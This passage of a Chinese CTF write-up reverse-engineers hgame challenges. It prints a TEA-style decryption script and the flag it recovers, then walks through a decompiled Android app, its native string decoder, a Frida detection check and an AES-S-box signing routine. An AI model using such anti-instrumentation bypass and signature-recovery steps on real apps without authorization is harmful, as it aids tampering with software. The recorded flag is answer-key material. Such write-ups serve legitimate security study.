class="number">9</span>]</span><br><span class="line">        before = a1[(i - <span class="number">1</span>) % <span class="number">9</span>]</span><br><span class="line">        a1[i] = (a1[i] - (((before ^ a2[v9 ^ i &amp; <span class="number">3</span>]) + (after ^ v6)) ^ (((before &lt;&lt; <span class="number">4</span>) ^ (after &gt;&gt; <span class="number">3</span>)) + ((after &lt;&lt; <span class="number">2</span>) ^ (before &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a1[i]),end=<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure>
<p>输出flag明文的十六进制：<font color=lime><strong>0x34656633, 0x63323237, 0x6264312d, 0x33342d66, 0x382d3762, 0x2d393536, 0x34633163, 0x34653061, 0x64346532</strong></font>，按小端序转成flag：<font color=deepskyblue><strong>hgame{3fe4722c-1dbf-43b7-8659-c1c4a0e42e4d}</strong></font>.</p>
<h3 id="Mysterious-signals："><a href="#Mysterious-signals：" class="headerlink" title="Mysterious signals："></a>Mysterious signals：</h3><p>查看mainactivity：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.andsign;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.OnApplyWindowInsetsListener;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Context m;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        EdgeToEdge.enable(<span class="built_in">this</span>);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), <span class="keyword">new</span> <span class="title class_">OnApplyWindowInsetsListener</span>() &#123; <span class="comment">// from class: com.nobody.andsign.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// androidx.core.view.OnApplyWindowInsetsListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> WindowInsetsCompat <span class="title function_">onApplyWindowInsets</span><span class="params">(View view, WindowInsetsCompat windowInsetsCompat)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> MainActivity.lambda$onCreate$<span class="number">0</span>(view, windowInsetsCompat);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.m = <span class="built_in">this</span>;</span><br><span class="line">        ((Button) findViewById(R.id.send)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.nobody.andsign.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                ((TextView) MainActivity.<span class="built_in">this</span>.findViewById(R.id.ret)).setText(<span class="keyword">new</span> <span class="title class_">SSSign</span>().a(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;hello&quot;</span>, ((TextView) MainActivity.<span class="built_in">this</span>.findViewById(R.id.Port)).getText().toString()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="comment">/* synthetic */</span> WindowInsetsCompat lambda$onCreate$<span class="number">0</span>(View view, WindowInsetsCompat windowInsetsCompat) &#123;</span><br><span class="line">        <span class="type">Insets</span> <span class="variable">insets</span> <span class="operator">=</span> windowInsetsCompat.getInsets(WindowInsetsCompat.Type.systemBars());</span><br><span class="line">        view.setPadding(insets.left, insets.top, insets.right, insets.bottom);</span><br><span class="line">        <span class="keyword">return</span> windowInsetsCompat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现输入端口号后按下按钮会把admin、hello和端口号传给SSSign类中的方法a，查看该类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody.andsign;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.NotificationCompat;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.JsonObject;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Call;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Callback;</span><br><span class="line"><span class="keyword">import</span> okhttp3.MediaType;</span><br><span class="line"><span class="keyword">import</span> okhttp3.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Request;</span><br><span class="line"><span class="keyword">import</span> okhttp3.RequestBody;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Response;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SSSign</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">b</span><span class="params">(String str)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">c</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;sssign&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">a</span><span class="params">(String str, String str2, String str3)</span> &#123;</span><br><span class="line">        <span class="type">OkHttpClient</span> <span class="variable">build</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().newBuilder().build();</span><br><span class="line">        <span class="type">JsonObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonObject</span>();</span><br><span class="line">        jsonObject.addProperty(c(<span class="string">&quot;104406435e045957&quot;</span>), str);</span><br><span class="line">        jsonObject.addProperty(c(<span class="string">&quot;035e0f545e045957&quot;</span>), str2);</span><br><span class="line">        <span class="type">RequestBody</span> <span class="variable">create</span> <span class="operator">=</span> RequestBody.create(MediaType.parse(<span class="string">&quot;application/json&quot;</span>), jsonObject.toString());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">CountDownLatch</span> <span class="variable">countDownLatch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line">        build.newCall(<span class="keyword">new</span> <span class="title class_">Request</span>.Builder().url(<span class="string">&quot;http://node1.hgame.vidar.club:&quot;</span> + str3 + <span class="string">&quot;/flag&quot;</span>).header(c(<span class="string">&quot;165e045f&quot;</span>), b(str + str2)).post(create).build()).enqueue(<span class="keyword">new</span> <span class="title class_">Callback</span>() &#123; <span class="comment">// from class: com.nobody.andsign.SSSign.1</span></span><br><span class="line">            <span class="keyword">static</span> <span class="keyword">final</span> <span class="comment">/* synthetic */</span> <span class="type">boolean</span> <span class="variable">$assertionsDisabled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// okhttp3.Callback</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onFailure</span><span class="params">(Call call, IOException iOException)</span> &#123;</span><br><span class="line">                SSSign.<span class="built_in">this</span>.result = <span class="string">&quot;onFailure&quot;</span>;</span><br><span class="line">                countDownLatch.countDown();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// okhttp3.Callback</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;OkHttp&quot;</span>, <span class="string">&quot;请求成功，码值: &quot;</span> + response.code());</span><br><span class="line">                <span class="keyword">if</span> (response.isSuccessful()) &#123;</span><br><span class="line">                    SSSign.<span class="built_in">this</span>.result = response.body().string();</span><br><span class="line">                    countDownLatch.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!countDownLatch.await(<span class="number">5L</span>, TimeUnit.MINUTES)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.result = <span class="string">&quot;请求超时&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException unused) &#123;</span><br><span class="line">            <span class="built_in">this</span>.result = <span class="string">&quot;等待过程被中断&quot;</span>;</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">asString</span> <span class="operator">=</span> ((JsonObject) <span class="keyword">new</span> <span class="title class_">Gson</span>().fromJson(<span class="built_in">this</span>.result, (Class&lt;Object&gt;) JsonObject.class)).get(NotificationCompat.CATEGORY_MESSAGE).getAsString();</span><br><span class="line">        <span class="built_in">this</span>.result = asString;</span><br><span class="line">        <span class="keyword">return</span> asString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现是把三个字符串<font color=violet><strong>“104406435e045957”</strong></font>和<font color=violet><strong>“035e0f545e045957”</strong></font>以及<font color=violet><strong>“165e045f”</strong></font>用本地方法c解密后构造成POST请求后发给服务器，并从服务器返回传回的文本，查看本地方法c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_nobody_andsign_SSSign_c</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+54h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+77h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v7 = sub_186D0(a1, a3);</span><br><span class="line">  v6 = sub_18700(a1, a3, &amp;v9);</span><br><span class="line">  v4 = (<span class="type">void</span> *)operator new(<span class="number">0x28u</span>LL);</span><br><span class="line">  sub_18740();</span><br><span class="line">  v5 = sub_187A0(v4, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v4)</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_18840(a1, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看解密函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18740</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)a1, <span class="string">&quot;e7c10e42b7a68e14&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)(a1 + <span class="number">17</span>), <span class="string">&quot;0123456789abcdef&quot;</span>);</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">36</span>) = <span class="number">0x11223344</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_18F20();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_18F20</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+10h] [rbp-290h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">520</span>]; <span class="comment">// [rsp+90h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( __fgets_chk(v3, <span class="number">512LL</span>, v2, <span class="number">512LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v3, <span class="string">&quot;frida&quot;</span>) || <span class="built_in">strstr</span>(v3, <span class="string">&quot;LIBFRIDA&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">36</span>) = <span class="number">0x44331122</span>;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现sub_18740构造了一个40字节的数组a1，并设置其值为<font color=lime><strong>“e7c10e42b7a68e14\x00 | 0123456789abcdef\x00 |  0x00 | 0x00 | 0x44 | 0x33 | 0x22 | 0x11”</strong></font>，且检测到frida时修改了最后4字节的值，再查看第二个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_187A0</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_19120(a1, a2, (<span class="type">unsigned</span> <span class="type">int</span>)a3);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a3 &gt;&gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(v4 + v5) ^= *(_BYTE *)(a1 + v5 % <span class="number">16</span>);</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">sub_19120</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  _BYTE *v9; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+24h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">malloc</span>((a3 &gt;&gt; <span class="number">1</span>) + <span class="number">1LL</span>);</span><br><span class="line">  __memset_chk(v9, <span class="number">0LL</span>, (a3 &gt;&gt; <span class="number">1</span>) + <span class="number">1LL</span>, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">unsigned</span> __int8 *)(a2 + v11) == *(<span class="type">char</span> *)(a1 + i + <span class="number">17</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">16</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">unsigned</span> __int8 *)(a2 + v11 + <span class="number">1</span>) == *(<span class="type">char</span> *)(a1 + j + <span class="number">17</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = j;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v10++;</span><br><span class="line">    v9[v3] = (v7 &amp; <span class="number">0xF</span>) + <span class="number">16</span> * v8;</span><br><span class="line">    v11 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现这个加密实际上是用sub_19120将带入的字符串每两个字符拼成一个字节，然后再循环异或a1的前16个字符<font color=red><strong>“e7c10e42b7a68e14”</strong></font>（每个字符以utf-8的方式异或，而不是两两拼成字节），将三个字符串<font color=red><strong>“104406435e045957”</strong></font>和<font color=red><strong>“035e0f545e045957”</strong></font>以及<font color=red><strong>“165e045f”</strong></font>分别带入得到<code>username</code>、<code>filename</code>和<code>sign</code>，但是sign的代入值是b方法处理的str1+str2，在so库中并没有找到同名方法，经过推测，应该是以下这些函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18870</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+54h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+77h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v7 = sub_186D0(a1, a3);</span><br><span class="line">  v6 = sub_18700(a1, a3, (__int64)&amp;v9);</span><br><span class="line">  v4 = (<span class="type">void</span> *)operator new(<span class="number">0x28u</span>LL);</span><br><span class="line">  sub_18740((__int64)v4);				<span class="comment">//这里又生成了那个同样的密钥</span></span><br><span class="line">  v5 = sub_18990(v4, v6, v7);			<span class="comment">//主要的加密函数</span></span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v4)</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_18840(a1, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18990</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-27Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-278h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+30h] [rbp-270h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+38h] [rbp-268h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">256</span>]; <span class="comment">// [rsp+90h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">264</span>]; <span class="comment">// [rsp+190h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+298h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;RijnDael_AES_LONG_FE70, <span class="keyword">sizeof</span>(dest));		<span class="comment">//将AES的S盒复制到dest</span></span><br><span class="line">  v7 = a3 + <span class="number">8</span> - a3 % <span class="number">8</span>;</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v7);</span><br><span class="line">  sub_18BB0(a1, v10);								<span class="comment">//第一个加密函数</span></span><br><span class="line">  __memset_chk(v6, <span class="number">0LL</span>, v7, <span class="number">-1LL</span>);</span><br><span class="line">  __memcpy_chk(v6, a2, a3, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">    v6[i] = dest[(<span class="type">unsigned</span> __int8)v6[i]];					<span class="comment">//将v6的每个字节重映射到S盒对应索引的对应字节值</span></span><br><span class="line">  v5 = sub_18C80(a1, v6, v10, (<span class="type">unsigned</span> <span class="type">int</span>)v7);				<span class="comment">//第二个加密函数</span></span><br><span class="line">  <span class="keyword">return</span> sub_18E20(a1, v5, (<span 